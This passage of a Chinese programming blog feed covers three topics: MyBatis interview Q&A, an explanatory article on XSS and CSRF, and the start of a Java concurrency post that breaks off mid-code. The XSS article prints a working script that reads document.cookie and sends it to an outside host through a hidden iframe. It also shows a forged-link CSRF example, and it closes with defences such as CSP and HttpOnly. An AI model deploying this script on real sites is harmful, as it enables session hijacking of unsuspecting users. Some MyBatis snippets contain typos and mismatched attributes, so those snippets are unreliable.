class="line">Mybatis在处理#&#123;&#125;时，会将sql中的#&#123;&#125;替换为?号，调用PreparedStatement的set方法来赋值</span><br><span class="line">Mybatis在处理$&#123;&#125;时，就是把$&#123;&#125;替换成变量的值</span><br><span class="line">使用#&#123;&#125;可以有效的防止SQL注入，提高系统安全性</span><br></pre></td></tr></table></figure><h3 id="当实体类中的属性名和表中字段名不一样怎么办"><a class="markdownIt-Anchor" href="#当实体类中的属性名和表中字段名不一样怎么办"></a> 当实体类中的属性名和表中字段名不一样，怎么办？</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一种：通过在查询的sql语句中定义字段名的别名，让字段名的别名和实体类的属性名一致</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectorder"</span> <span class="attr">paramaterType</span>=<span class="string">"int"</span> <span class="attr">resultType</span>=<span class="string">"me.gacl.domain.order"</span>&gt;</span></span><br><span class="line">  select order_id id, order_no orderno, order_price price from orders where order_id=#&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">第二种：通过<span class="tag">&lt;<span class="name">resultMap</span>&gt;</span>来映射字段名和实体类属性名的一一对应的关系</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"getOrder"</span> <span class="attr">parameterType</span>=<span class="string">"int"</span> <span class="attr">resultType</span>=<span class="string">"orderResultMap"</span>&gt;</span></span><br><span class="line">  select * from orders where order_id=#&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">"me.gacl.domain.order"</span> <span class="attr">id</span>=<span class="string">"orderResultMap"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">!-用id属性来映射主键字段-</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"order_id"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">!-用result属性来映射非主键字段，property为实体类属性名，column为数据表中的属性-</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"orderno"</span> <span class="attr">column</span>=<span class="string">"order_no"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"price"</span> <span class="attr">column</span>=<span class="string">"order_price"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="模糊查询like语句该怎么写"><a class="markdownIt-Anchor" href="#模糊查询like语句该怎么写"></a> 模糊查询like语句该怎么写？</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一种：在Java代码中添加sql通配符</span><br><span class="line">String wildCardName = "%smi%";</span><br><span class="line">list<span class="tag">&lt;<span class="name">name</span>&gt;</span> names = mapper.selectlike(wildCardName);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span> = <span class="string">"selectlike"</span>&gt;</span></span><br><span class="line">  select * from foo where bar like #&#123;value&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第2种：在sql语句中拼接通配符，会引起sql注入</span><br><span class="line">String wildCardName = "smi";</span><br><span class="line">list<span class="tag">&lt;<span class="name">name</span>&gt;</span> names = mapper.selectlike(wildCardName);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectlike"</span>&gt;</span></span><br><span class="line">  select * from foo where bar like "%"#&#123;value&#125;"%"</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第3种：使用动态SQL语句，OGNL表达式中的bind标签</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectEmployLikeName"</span> <span class="attr">resultType</span>=<span class="string">"org.fkit.domain.Employee"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bind</span> <span class="attr">name</span>=<span class="string">"pattern"</span> <span class="attr">value</span>=<span class="string">"'%' + _parameter.getName() + '%'"</span> /&gt;</span></span><br><span class="line">  select * from tb_employee where loginname like #&#123;pattern&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据传入的参数进行模糊查询</span></span><br><span class="line"><span class="function">List&lt;Employee&gt; <span class="title">selectEmployeeLikeName</span><span class="params">(Employee employee)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(SqlSession session)</span> </span>&#123;</span><br><span class="line">  EmployeeMapper em = session.getMapper(EmployeeMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">  Employee employee = <span class="keyword">new</span> Employee();</span><br><span class="line">  <span class="comment">// 设置模糊查询的参数</span></span><br><span class="line">  employee.setName(<span class="string">"o"</span>);</span><br><span class="line">  List&lt;Employee&gt; list = em.selectEmployeeLikeName(employee);</span><br><span class="line">  System.out.println(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通常一个xml映射文件都会写一个dao接口与之对应请问这个dao接口的工作原理是什么dao接口里的方法参数不同时方法能重载吗"><a class="markdownIt-Anchor" href="#通常一个xml映射文件都会写一个dao接口与之对应请问这个dao接口的工作原理是什么dao接口里的方法参数不同时方法能重载吗"></a> 通常一个xml映射文件，都会写一个Dao接口与之对应，请问，这个Dao接口的工作原理是什么？Dao接口里的方法，参数不同时，方法能重载吗？</h3><p>答：Dao接口，就是人们通常说的Mapper接口，接口的全限名，就是映射文件中的namespace的值，接口的方法名，就是映射文件中MappedStatement的id值，就是传递给sql的参数。Mapper接口没有实现类，当调用接口方法时，接口全限名+方法名拼接字符串作为key值，可唯一定位一个MappedStatement，举例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.mybatis3.mappers.StudentDao.findStudentById，可以唯一找到namespace为com.mybatis3.mappers.StudentDao下面id = findStudentById的MappedStatement。在Mybatis中，每一个<span class="tag">&lt;<span class="name">select</span>&gt;</span>、<span class="tag">&lt;<span class="name">insert</span>&gt;</span>、<span class="tag">&lt;<span class="name">update</span>&gt;</span>、<span class="tag">&lt;<span class="name">delete</span>&gt;</span>标签，都会被解析为一个MappedStatement对象</span><br></pre></td></tr></table></figure><p>Dao接口里的方法，是不能重载的，因为是全限名+方法名的保存和寻找策略。<br />Dao接口的工作原理是JDK动态代理，Mybatis运行时会使用JDK动态代理为Dao接口生成代理proxy对象，代理对象proxy会拦截方法接口，转而执行MappedStatement所代表的sql，然后将sql执行结果返回。</p><h3 id="mybatis是如何将sql执行结果封装成目标对象并返回的都有哪些映射形式"><a class="markdownIt-Anchor" href="#mybatis是如何将sql执行结果封装成目标对象并返回的都有哪些映射形式"></a> Mybatis是如何将sql执行结果封装成目标对象并返回的？都有哪些映射形式？</h3><p>答：第一种是使用<resultMap>标签，逐一定义列名和对象属性名之间的映射关系；第二种是使用sql列的别名功能，将列别名书写为对象属性名，比如T_NAME AS NAME，对象属性名一般是name，小写，但是列名不区分大小写，Mybatis会忽略列名大小写，智能找到与之对应对象属性名，甚至可以写成T_NAME AS NaMe，Mybatis一样可以正常工作。<br />有了列名与属性名的映射关系后，Mybatis通过反射创建对象，同时使用反射给对象的属性逐一赋值并返回，那些找不到映射关系的属性，是无法完成赋值的。</p><h3 id="mybatis是如何进行分页的分页插件的原理是什么"><a class="markdownIt-Anchor" href="#mybatis是如何进行分页的分页插件的原理是什么"></a> Mybatis是如何进行分页的？分页插件的原理是什么？</h3><p>答：Mybatis使用RowBounds对象进行分页，它是针对ResultSet结果集执行的内存分页，而非物理分页，可以在sql内直接书写带有物理分页的参数来完成物理分页功能，也可以使用分页插件来完成物理分页。<br />分页插件的基本原理是使用Mybatis提供的插件接口，实现自定义插件，在插件的拦截方法内拦截待执行的sql，然后重写sql，根据dialect方言，添加对应的物理分页语句和物理分页参数。</p><h3 id="如何执行批量插入"><a class="markdownIt-Anchor" href="#如何执行批量插入"></a> 如何执行批量插入？</h3><p>首先，创建一个简单的insert语句：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"insertname"</span>&gt;</span></span><br><span class="line">  insert into names (name) values (#&#123;value&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在Java代码中像下面这样执行批处理插入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">List&lt;string&gt; names = <span class="keyword">new</span> ArrayList&lt;&gt;(); </span><br><span class="line">names.add(“fred”); </span><br><span class="line">names.add(“barney”); </span><br><span class="line">names.add(“betty”); </span><br><span class="line">names.add(“wilma”); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意这里 executortype.batch </span></span><br><span class="line">sqlsession sqlsession = sqlsessionfactory.opensession(executortype.batch); </span><br><span class="line"><span class="keyword">try</span> &#123; </span><br><span class="line">  namemapper mapper = sqlsession.getmapper(namemapper<span class="class">.<span class="keyword">class</span>)</span>; </span><br><span class="line">  <span class="keyword">for</span> (string name : names) &#123; </span><br><span class="line">    mapper.insertname(name); </span><br><span class="line">  &#125; </span><br><span class="line">  sqlsession.commit(); </span><br><span class="line">&#125; <span class="keyword">finally</span> &#123; </span><br><span class="line">  sqlsession.close(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="如何获取自动生成的主键值"><a class="markdownIt-Anchor" href="#如何获取自动生成的主键值"></a> 如何获取自动生成的（主）键值？</h3><p>答：insert方法总是返回一个int值，这个值代表的是插入的行数。而自动生成的键值在insert方法执行完后可以被设置到传入的参数对象中。示例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"insertname"</span> <span class="attr">useGeneratedkeys</span>=<span class="string">"true"</span> <span class="attr">keyProperty</span>=<span class="string">"id"</span>&gt;</span></span><br><span class="line">  insert into name (name) values (#&#123;name&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br><span class="line">name name = new name();</span><br><span class="line">name.setName("fred");</span><br><span class="line"></span><br><span class="line">int rows = mapper.insertname(name);</span><br><span class="line">System.out.println("row inserted=" + rows);</span><br><span class="line">System.out.println("generated key value=" + name.getId());</span><br></pre></td></tr></table></figure><h3 id="在mapper中如何传递多个参数"><a class="markdownIt-Anchor" href="#在mapper中如何传递多个参数"></a> 在mapper中如何传递多个参数？</h3><p>第一种：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Dao层的函数</span><br><span class="line">public selectUser(String name, String area);</span><br><span class="line"></span><br><span class="line"># 对应的xml，#&#123;0&#125;代表接收的是dao层的第一个参数，#&#123;1&#125;代表dao层中第二个参数，更多参数一致往后即可。</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectUser"</span> <span class="attr">resultMap</span>=<span class="string">"BaseResultMap"</span>&gt;</span></span><br><span class="line">  select * from user_user_t where user_name=#&#123;0&#125; and user_area=#&#123;1&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第二种：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 使用@param注解</span><br><span class="line">import org.apache.ibatis.annotations.param;</span><br><span class="line"></span><br><span class="line">public interface userMapper(user selectUser(@param("userName") String userName, @param("hashedPassword") String hashedPassword));</span><br><span class="line"></span><br><span class="line"># 然后就可以在xml像下面这样使用（推荐封装为一个map，作为单个参数传递个mapper）</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectUser"</span> <span class="attr">resultType</span>=<span class="string">"user"</span>&gt;</span></span><br><span class="line">  select id, username, hashedPassword from some_table where userName=#&#123;userName&#125; and hashedPassword=#&#123;hashedPassword&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="mybatis动态sql是做什么都有哪些动态sql能简述一下动态sql的执行原理不"><a class="markdownIt-Anchor" href="#mybatis动态sql是做什么都有哪些动态sql能简述一下动态sql的执行原理不"></a> Mybatis动态sql是做什么？都有哪些动态sql？能简述一下动态sql的执行原理不？</h3><p>答：Mybatis的动态sql可以让我们在xml映射文件内，以标签形式编写动态sql，完成逻辑判断和动态拼接sql的功能。<br />Mybatis提供了9种动态sql标签：trim|where|set|foreach|if|choose|when|otherwise|bind<br />其执行原理为，使用OGNL从sql参数对象中计算表达式的值，根据表达式的值动态拼接sql，以此来完成动态sql的功能。</p><h3 id="mybatis的xml映射文件中不同的xml映射文件id是否可以重复"><a class="markdownIt-Anchor" href="#mybatis的xml映射文件中不同的xml映射文件id是否可以重复"></a> Mybatis的xml映射文件中，不同的xml映射文件，id是否可以重复？</h3><p>答：不同的xml映射文件，如果配置了namespace，那么id可以重复；如果没有配置namespace，那么id不能重复；毕竟namespace不是必须的，只是最佳实践而已。<br />原因就是namespace+id是作为Map&lt;String, MappedStatement&gt;的key使用的，如果没有namespace，就剩下id，那么，id重复会导致数据相互覆盖。有了namespace，自然id就可以重复，namespace不同，namespace+id自然也就不同。</p><h3 id="为什么说mybatis是半自动的orm映射工具它与全自动的区别在哪里"><a class="markdownIt-Anchor" href="#为什么说mybatis是半自动的orm映射工具它与全自动的区别在哪里"></a> 为什么说Mybatis是半自动的ORM映射工具？它与全自动的区别在哪里？</h3><p>答：Hibernate属于全自动ORM映射工具，使用Hibernate查询关联对象或者关联集合对象时，可以根据对象关系模型直接获取，所以它是全自动的。<br />Mybatis在查询关联对象或关联集合对象时，需要手动编写sql来完成，所以，称之为半自动ORM映射工具。</p><h3 id="一对一-一对多的关联查询"><a class="markdownIt-Anchor" href="#一对一-一对多的关联查询"></a> 一对一、一对多的关联查询？</h3><pre class="highlight"><code class="xml"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"com.lcb.mapping.userMapper"</span>&gt;</span>  <span class="comment">&lt;!--association 一对一关联查询--&gt;</span>  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"getClass"</span> <span class="attr">parameterType</span>=<span class="string">"int"</span> <span class="attr">resultMap</span>=<span class="string">"ClassesResultMap"</span>&gt;</span>    select * from class c, teacher t where c.teacher_id=t.id and c.c_id=#{id}  <span class="tag">&lt;/<span class="name">select</span>&gt;</span>  <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">"com.lcb.user.Classes"</span> <span class="attr">id</span>=<span class="string">"ClassesResultMap"</span>&gt;</span>    <span class="comment">&lt;!--实体类的字段名和数据表的字段名映射--&gt;</span>    <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"c_id"</span>/&gt;</span>    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"c_name"</span>/&gt;</span>    <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"teacher"</span> <span class="attr">javaType</span>=<span class="string">"com.lcb.user.Teacher"</span>&gt;</span>      <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"t_id"</span>/&gt;</span>      <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"t_name"</span>&gt;</span>    <span class="tag">&lt;/<span class="name">association</span>&gt;</span>  <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span>  <span class="comment">&lt;!--collection 一对多关联查询--&gt;</span>  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"getClass2"</span> <span class="attr">parameter</span>=<span class="string">"int"</span> <span class="attr">resultMap</span>=<span class="string">"ClassesResultMap2"</span>&gt;</span>    select * from class c, teacher t, student s where c.teacher_id=t.t_id and c.c_id=s.class_id and c.c_id=#{id}  <span class="tag">&lt;/<span class="name">select</span>&gt;</span>  <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">"com.lcb.user.Classes"</span> <span class="attr">id</span>=<span class="string">"ClassesResultMap2"</span>&gt;</span>    <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"c_id"</span>/&gt;</span>    <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"c_name"</span>/&gt;</span>    <span class="tag">&lt;<span class="name">association</span> <span class="attr">property</span>=<span class="string">"teacher"</span> <span class="attr">javaType</span>=<span class="string">"com.lcb.user.Teacher"</span>&gt;</span>      <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"t_id"</span>/&gt;</span>      <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"t_name"</span>/&gt;</span>    <span class="tag">&lt;/<span class="name">association</span>&gt;</span>    <span class="tag">&lt;<span class="name">collection</span> <span class="attr">property</span>=<span class="string">"student"</span> <span class="attr">ofType</span>=<span class="string">"com.lcb.user.Student"</span>&gt;</span>      <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"s_id"</span>/&gt;</span>      <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"name"</span> <span class="attr">column</span>=<span class="string">"s_name"</span>/&gt;</span>    <span class="tag">&lt;/<span class="name">collection</span>&gt;</span>  <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span>```1</code></pre>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> Java Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Java Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS与CSRF</title>
      <link href="/xss-and-csrf/"/>
      <url>/xss-and-csrf/</url>
      
        <content type="html"><![CDATA[<p><em>以下内容全部来自于转载</em></p><h2 id="xss和csrf的介绍"><a class="markdownIt-Anchor" href="#xss和csrf的介绍"></a> XSS和CSRF的介绍</h2><p>XSS：通过客户端脚本语言（最常见是JavaScript）在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那就叫做XSS！</p><p>CSRF：又称XSRF，冒充用户发起请求（在用户不知情的情况下）完成一些违背用户意愿的请求（如恶意发帖、删帖、改密码、发邮件等）。</p><p>通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。</p><p>XSS更偏向与代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。</p><p>场景：我在一条帖子里面写下了如下代码，发了出去，然后陆陆续续有很多可爱（wu / zhi） 的用户访问到这个帖子，然后用户接下来的所有操作都由我这串代码掌控了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    alert(<span class="string">'你关不掉我'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个就是最原始的脚本注入了。用户进来就麻烦了，一直弹窗一直弹窗。<br />那么XSS（跨站脚本）就是照瓢画葫了，用JavaScript写一个请求跨站的脚本就是XSS了，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt; 包起来放在评论中</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window, document</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 构造泄露信息用的 URL</span></span><br><span class="line">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</span><br><span class="line">    <span class="keyword">var</span> xssURIBase = <span class="string">"http://192.168.123.123/myxss/"</span>;</span><br><span class="line">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</span><br><span class="line">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></span><br><span class="line">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    hideFrame.height = <span class="number">0</span>;</span><br><span class="line">    hideFrame.width = <span class="number">0</span>;</span><br><span class="line">    hideFrame.style.display = <span class="string">"none"</span>;</span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line">    <span class="comment">// 开工</span></span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</span><br></pre></td></tr></table></figure><p>此段代码携带着cookie信息传输给了不安全的服务器，然后服务器接受到了用户的隐私消息，继而继续做其他的业务处理。</p><p>这里tips一下：上面的代码仅仅是XSS，并没有发生CSRF，因为192.168.123.123/myxss/index.php 仅仅是把用户信息存起来了而已，他并没有“伪造”用户发起一些请求，所以他只算是XSS攻击而不算是CSRF攻击，如果192.168.123.123/myxss/index.php 写的代码是 将当前用户的昵称改为“我是大笨猪”，那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。</p><p>那么下面我介绍一下最最简单的CSRF攻击（没有用到XSS的哦）：</p><p>一个论坛，经过我的多次抓包分析（着重分析请求返回头，请求返回体）了解到这个论坛的删帖操作是触发 <a href="http://csdnblog.com/bbs/delete_article.php?id=%E2%80%9CX" target="_blank" rel="noopener">csdnblog.com/bbs/delete_article.php?id=“X</a>&quot; 那么，我只需要在论坛中发一帖，包含一链接：<a href="http://www.csdnblog.com/bbs/delete_article.php?id=%E2%80%9CX" target="_blank" rel="noopener">www.csdnblog.com/bbs/delete_article.php?id=“X</a>&quot; ，只要有用户点击了这个链接，那么ID为X的这一篇文章就被删掉了，而且是用户完全不知情的情况（敲黑板状：此处我可没有写XSS脚本哦，我纯粹是发一个url地址出来而已，既然删除操作可以伪造，那么只要我细细分析，其他操作（发帖，改名字，发私信，只要是这个论坛具有的功能）我都可以伪造咯！</p><h2 id="xss与csrf的防范"><a class="markdownIt-Anchor" href="#xss与csrf的防范"></a> XSS与CSRF的防范</h2><p>CSRF依赖于XSS，防住XSS基本也就防住了CSRF让我们明确我们的目的，其实就是不让用户踏入XSS的坑，那我们有两个方法防止用户入坑，一个是对外部输入进行彻彻底底的敏感字符过滤，一个是在显示的时候做一些特殊处理不让敏感代码顺利执行。前者主要由前端与后端合力完成，后者的话通常就是由前端单独去完成的。</p><p>理论上只要有输入数据入口的地方，XSS漏洞就会存在，js代码可以由各种各样的模式注入到数据库中（明文或者编码），所以在中小项目中我们先明确一个意识即可，我们开发人员要有安全处理的意识，不求百分百的过滤掉非法字符，但是基本的，常见的过滤掉即可，剩下的就交给安全工程师去做吧。</p><p>中心思想：一切的一切外部来源数据，毕竟经过我们服务端代码的过滤，才能让他展示到页面上，也就是说，一切外部数据都是非法的，一定要做好过滤，尤其是WEB端。（毕竟各种js防不胜防）。</p><p><strong>通用的补充性防御手段</strong></p><ol><li><p>在输出html时，加上Content Security Policy的Http Header<br />作用：可以防止页面被XSS攻击时，嵌入第三方的脚本文件等<br />缺陷：IE或低版本的浏览器可能不支持</p></li><li><p>在设置Cookie时，加上HttpOnly参数<br />作用：可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6<br />缺陷：网站本身的JS代码也无法操作Cookie，而且作用有限，只能保证Cookie的安全</p></li><li><p>在开发API时，检验请求的Referer参数<br />作用：可以在一定程度上防止CSRF攻击<br />缺陷：IE或低版本的浏览器中，Referer参数可以被伪造</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>并发编程</title>
      <link href="/java-concurrent-summary/"/>
      <url>/java-concurrent-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="可重入内置锁"><a class="markdownIt-Anchor" href="#可重入内置锁"></a> 可重入内置锁</h2><p>同一个线程在调用本类中其他synchronized方法/块或父类中的synchronized方法/块时，都不会阻碍该线程地执行，因为互斥锁时可重入的。</p><h2 id="中断线程"><a class="markdownIt-Anchor" href="#中断线程"></a> 中断线程</h2><h3 id="使用interrupt中断线程"><a class="markdownIt-Anchor" href="#使用interrupt中断线程"></a> 使用interrupt()中断线程</h3><p>当一个线程运行时，另一个线程可以调用对应的Thread对象的interrupt()方法中断它。该方法只是在目标线程中设置了一个标志位，表示它已经被中断，并立即返回。<code>如果只是单纯的调用interrupt()方法，线程并没有实际中断，会继续执行。</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SleepInterrupt</span> <span class="keyword">extends</span> <span class="title">Object</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span 